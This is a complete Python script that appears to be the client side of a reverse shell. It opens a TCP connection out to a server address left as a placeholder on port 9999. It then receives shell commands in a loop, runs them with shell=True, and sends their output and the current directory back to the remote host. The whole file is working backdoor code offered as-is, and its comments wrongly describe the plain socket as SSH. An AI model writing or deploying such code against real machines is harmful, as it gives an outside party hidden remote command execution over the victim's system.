import os 
import socket
import subprocess

socket_i = socket.socket()
#Host is the IP Address of the Server.
host = 'ENTER SERVER IP'
port = 9999
socket_i.connect((host,port))

while True:
	data_on_buffer = socket_i.recv(1024)
	#Checks the Directory Command Receives via Socket
	if "cd" in data_on_buffer.decode("utf-8"):
		os.chdir(data_on_buffer[3:].decode("utf-8"))
	if len(data_on_buffer) > 0:
		command = subprocess.Popen(data_on_buffer[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		#String Output is for Client Output and Byte is to Send it to the Server through SSH
		output_byte = command.stdout.read() + command.stderr.read()
		output_str = str(output_byte, "utf-8")
		#Printing the Output and the Working Directory
		socket_i.send( str.encode( output_str + str(os.getcwd()) + " > " ) )
		print(output_str)

#If Inf Loop Ends:
socket_i.close()

























